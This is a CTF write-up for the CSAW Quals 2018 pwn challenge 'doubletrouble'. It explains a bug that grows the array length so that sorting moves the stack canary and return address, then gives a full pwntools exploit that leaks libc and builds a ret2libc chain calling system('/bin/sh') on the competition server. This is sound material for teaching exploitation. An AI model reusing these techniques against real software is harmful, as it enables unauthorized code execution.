---
title: CSAW Quals 18 - doubletrouble
date: '2018-09-17'
lastmod: '2019-04-07T13:46:27+02:00'
categories:
- writeup
- csawquals18
tags:
- pwn
authors:
- andreafioraldi
---

The core function is the following:

```c
int game()
{
  int v0;
  long double sum;
  long double max;
  long double min;
  int v4;
  int how_long;
  int idx;
  char *s;
  double array[64];
  unsigned int v10;

  canary = __readgsdword(0x14u);
  printf("%p\n", array);  // Stack address leak
  printf("How long: ");
  __isoc99_scanf("%d", &how_long);
  getchar();
  if ( how_long > 64 )
  {
    printf("Flag: hahahano. But system is at %d", &system);
    exit(1);
  }
  idx = 0;
  while ( idx < how_long )
  {
    s = malloc(100u);
    printf("Give me: ");
    fgets(s, 100, stdin);
    v0 = idx++;
    array[v0] = atof(s);
  }
  printArray(&how_long, array);
  sum = sumArray(&how_long, array);
  printf("Sum: %f\n", sum);
  max = maxArray(&how_long, array);
  printf("Max: %f\n", max);
  min = minArray(&how_long, array);
  printf("Min: %f\n", min);
  v4 = findArray(&how_long, array, -100.0, -10.0);
  printf("My favorite number you entered is: %f\n", array[v4]);
  sortArray(&how_long, array);
  puts("Sorted Array:");
  return printArray(&how_long, array);
}
```

The programs store the readed doubles in an array on the stack.
The array is 532 bytes from the return address, so 64 entries are not enough for a buffer overflow.

The findArray function is interesting, a correct manipulation of the input can change the how_long variable.

```c
int findArray(int *len, double *arr, double a, double b)
{
  int saved_len;

  saved_len = *len;
  while ( *len < 2 * saved_len )
  {
    if ( arr[*len - saved_len] > a && b > arr[*len - saved_len] )
      return *len - saved_len; // Here *len is not restored to saved_len
    *len += &GLOBAL_OFFSET_TABLE_ - 134529023; //*len += 1
  }
  *len = saved_len; // We want to avoid this piece of code
  return 0;
}
```

Giving a number greater than -10 `*len` is increased and with a number greater than -100 and lower than -10 we can avoid the restring of `*len` with `saved_len`.

We choose -1.1 and -20.1.

With `how_long` greater than 64 the sortArray procedure will sort our input and the values that are on the stack after the array, like the canary and the return address.

The binary addresses casted to double are sorted after -1.1.

To exploit the vulnerability we need to place the canary in the same position before and after the sorting so it must start with 0x00b.
Due to this requirement the exploit must be runned many times to work.

Here the exploit:

```python
#!/usr/bin/env python

from pwn import *

LIBC_NAME = "./libc6_2.27-3ubuntu1_i386.so" # found on libc database using system (0x200)

def pdouble(f):
    return struct.pack('<d', f)

def double_to_hex(f):
    return hex(struct.unpack('<Q', struct.pack('<d', f))[0])

def int_to_double(i):
    return struct.unpack('<d', p64(i))[0]

def hex_to_double(h):
    return struct.unpack('<d', h.decode("hex")[::-1])[0]

libc = ELF(LIBC_NAME)

while True:
    #p = process("./doubletrouble", env={"LD_PRELOAD": LIBC_NAME})
    p = remote("pwn.chal.csaw.io", 9002)

    try:

        ### STAGE 1 - leak libc a restart main

        stack = int(p.recvline(False), 16)

        l = 64
        p.sendafter("How long: ", str(l) + "\n")

        p.sendafter("Give me: ", repr(int_to_double(0x8049506FFE26D6C)) + "\n") #main = 0x8049506
        p.sendafter("Give me: ", repr(int_to_double(0x8049506FFE26D6C)) + "\n")

        for i in xrange(3):
            p.sendafter("Give me: ", "-1.1\n")

        for i in xrange(l -5):
            p.sendafter("Give me: ", "-20.1\n")

        p.recvuntil("Sorted Array:")
        p.recvuntil("0:")

        off = 0xf7f8bfff - 0xF7DB4000

        libc.address = u32(pdouble(float(p.recvline(False)))[4:]) - off
        if libc.address & 1 == 1:
            libc.address -= 1

        print "LIBC: ", hex(libc.address), hex(libc.symbols["system"])[2:]

        p.recvuntil("68:") + p.recvline(False)


        ### STAGE 2 - execute system("/bin/sh")

        stack = int(p.recvline(False), 16)

        l = 64
        p.sendafter("How long: ", str(l) + "\n")

        v = hex_to_double(("0804900a0804900a")) #0x0804900a : ret
        p.sendafter("Give me: ", repr(v) + "\n")

        v = hex_to_double("0804A0D5" + hex(libc.symbols["system"])[2:])
        p.sendafter("Give me: ", repr(v) + "\n")

        bin_sh = libc.address + 0x17e0cf
        v = hex_to_double(("09049786" + hex(bin_sh)[2:]))
        p.sendafter("Give me: ", repr(v) + "\n")

        for i in xrange(2):
            p.sendafter("Give me: ", "-1.1\n")

        for i in xrange(l -5):
            p.sendafter("Give me: ", "-20.1\n")

        p.recvuntil("Sorted Array:")
        p.recvuntil("0:")

        p.interactive()
        p.close()
    except KeyboardInterrupt:
        p.close()
        exit()
    except Exception:
        p.close()
        continue
```
